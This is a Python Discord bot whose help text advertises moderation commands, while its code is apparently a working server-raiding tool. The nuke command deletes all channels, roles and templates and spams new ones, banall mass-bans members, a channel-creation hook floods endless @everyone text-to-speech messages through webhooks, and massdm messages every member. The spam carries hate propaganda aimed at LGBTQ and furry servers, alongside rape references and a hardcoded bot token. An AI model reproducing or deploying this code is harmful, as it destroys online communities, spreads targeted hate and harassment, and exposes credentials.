import os
from discord.ext import commands
import discord
import asyncio


prefix = "!"
channel_name = "Overthrown By ItWasntMe"
role_name = "Overthrown By ItWasntMe"
server_name = "Overthrown By ItWasntMe"
webhook_name = "Overthrown By ItWasntMe"
message = ("@everyone INVADED BY DA YOUR SERVER HAS BEEN DESTROYED UNDER OPERATION: THE FIRST WAVE LED BY DA WHERE WE WILL PURGE AS MANY-LGBTQ/FURRIES-SERVERS-AS-WE-CAN. HEIL DA THIS SERVER WAS NUKED UNDER ITWASNTMES COMMAND. HEIL DA https://discord.gg/fDXsxnWJeR DESTROYED-BY-ITWASNTME https://cdn.discordapp.com/attachments/1395756899244310668/1396101873894686812/NDA.jpg?ex=687cdcb1&is=687b8b31&hm=085c452c0045d4c8892b2ae172f0ad25214ddb2d9e2459f4ef47910c801986c6&")
token = "MTM5NjA2MjY0NzE1MzA3MDIxMw.GNBGzc.u9kDpNadknXvBvIJqZFdjFdiG2hCAvOTfzpd2Q"


bot =  discord.ext.commands.Bot(command_prefix=prefix, help_command=None, intents=discord.Intents.all())


@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📖 Command List",
        description="Use `!help <command>` to get more info (coming soon if needed).",
        color=discord.Color.blurple()
    )

    embed.add_field(name="`!automod`", value="Enables basic auto moderation.", inline=False)
    embed.add_field(name="`!kick`", value="Kicks a member from the server.", inline=False)
    embed.add_field(name="`!ban`", value="Bans a member from the server.", inline=False)
    
    await ctx.send(embed=embed)


@bot.event 
async def on_ready():
    print("Bot ready.")
 
 
@bot.command()
async def kmodhelp(ctx):
    await ctx.send("holy fuck im cumming")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    tasks = []
    
    tasks.extend([member.ban(reason="raped") for member in ctx.guild.members if member.bot and member != ctx.guild.me])
    tasks.extend([role.delete() for role in ctx.guild.roles if role != ctx.guild.default_role and role != ctx.guild.me.top_role])
    
    if ctx.guild.templates:
        templates = await ctx.guild.templates()
        tasks.extend([template.delete() for template in templates])
    
    tasks.extend([channel.delete() for channel in ctx.guild.channels])
    
    try:
        await asyncio.gather(*tasks)
    except Exception:
        pass
    
    create_tasks = []
    for _ in range(20):
        create_tasks.append(ctx.guild.create_text_channel(channel_name))
        create_tasks.append(ctx.guild.create_role(name=role_name))
    await asyncio.gather(*create_tasks)
    await massdm(ctx)

@bot.command() 
async def check(ctx):
    guild = ctx.guild
    
    if guild:
        bot_member = guild.me
        if bot_member.guild_permissions.administrator:
            await ctx.send("The bot is working perfectly")
        else:
            await ctx.send("Bot is in under-going work")
    else:
        await ctx.send("Error")

@bot.event
async def on_guild_channel_create(channel):
    if channel.name == channel_name:
        try:
            await channel.guild.edit(name=server_name)
            webhook = await channel.create_webhook(name=webhook_name)
            while True:
                # create
                tasks = []
                for _ in range(10):  # make 10 
                    tasks.append(channel.send(f"@everyone @here\n{message}", tts=True))
                    tasks.append(webhook.send(f"@everyone @here\n{message}", tts=True))
                await asyncio.gather(*tasks)
                
        except discord.errors.Forbidden:
            pass


@bot.command()
@commands.has_permissions(administrator=True)  
async def banall(ctx):

    banned_count = 0
    failed_bans = 0
    for member in ctx.guild.members:
        if member != ctx.author and not member.bot:  
            try:
                await member.ban(reason=f"graped")
                banned_count += 1
            except discord.Forbidden:
                failed_bans += 1
            except Exception as e:
                print(f"Failed to ban {member}: {e}")
                failed_bans += 1
                await nuke(ctx)

    
    await ctx.send(f"ban complete. banned{banned_count} members. failed to ban {failed_bans} members.")


@banall.error
async def banall_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("you cant use this command.")
    else:
        await ctx.send("an error happened please contact the bot creator.")

@bot.command()
async def massdm(ctx):
    for member in ctx.guild.members: 
        try:
            await member.send("Your server has been overtaken by ItWasntMe HEIL DA https://discord.gg/fDXsxnWJeR")
        except:pass

bot.run(token)
